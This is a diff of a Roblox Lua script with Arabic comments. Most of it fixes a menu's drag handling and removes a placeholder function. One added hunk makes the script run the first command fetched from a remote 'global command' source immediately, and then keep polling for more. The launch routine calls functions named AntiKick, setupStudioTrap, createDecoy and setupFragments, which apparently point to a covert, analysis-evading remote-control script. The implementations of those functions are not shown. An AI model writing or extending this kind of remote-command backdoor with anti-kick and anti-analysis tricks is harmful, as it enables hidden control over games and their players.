@@ -360,6 +360,11 @@ end
 
 local function startCommandListener()
     lastCommand = fetchGlobalCommand()
+    -- تنفيذ أول أمر يُقرأ فوراً
+    if lastCommand ~= "" then
+        print("[GLOBAL] Initial command: " .. lastCommand)
+        executeGlobalCommand(lastCommand)
+    end
     while true do
         task.wait(6)
         local newCommand = fetchGlobalCommand()
@@ -660,21 +665,24 @@ local function CreateMenuGUI()
     closeBtn.Parent = titleBar
     closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 
-    -- آلية السحب
+    -- ✅ آلية السحب الصحيحة
     local UserInputService = game:GetService("UserInputService")
-    local dragging, dragStart, frameStart = false, Vector2.new(0,0), frame.Position
+    local dragging, dragStart, frameStart
+
     titleBar.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
             dragging = true
             dragStart = input.Position
             frameStart = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
         end
     end)
+
+    titleBar.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
+
     UserInputService.InputChanged:Connect(function(input)
         if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
             local delta = input.Position - dragStart
@@ -692,7 +700,7 @@ local function CreateMenuGUI()
     buttonContainer.BackgroundTransparency = 1
     buttonContainer.ScrollBarThickness = 4
     buttonContainer.ScrollBarImageColor3 = Color3.fromRGB(100,100,100)
-    buttonContainer.CanvasSize = UDim2.new(0,0,0,0) -- سيتم ضبطه تلقائيا
+    buttonContainer.CanvasSize = UDim2.new(0,0,0,0)
     buttonContainer.Parent = frame
 
     local layout = Instance.new("UIGridLayout")
@@ -813,7 +821,6 @@ local function CreateMenuGUI()
         end
     end)
 
-    -- ضبط حجم Canvas تلقائياً
     layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X, 0, layout.AbsoluteContentSize.Y + 40)
     end)
@@ -834,15 +841,9 @@ local function startSlowBurn()
     end)
 end
 
--- دالة وهمية لمنع انتهاء المهلة
-local function AntiTimeOut()
-    -- Placeholder – يمكنك إضافة أي إجراء لاحقاً
-end
-
 -- =============================[ MAIN LAUNCH ]=============================
 local function Launch()
     AntiKick()
-    AntiTimeOut()
     setupStudioTrap(script)
     createDecoy()
     setupFragments()
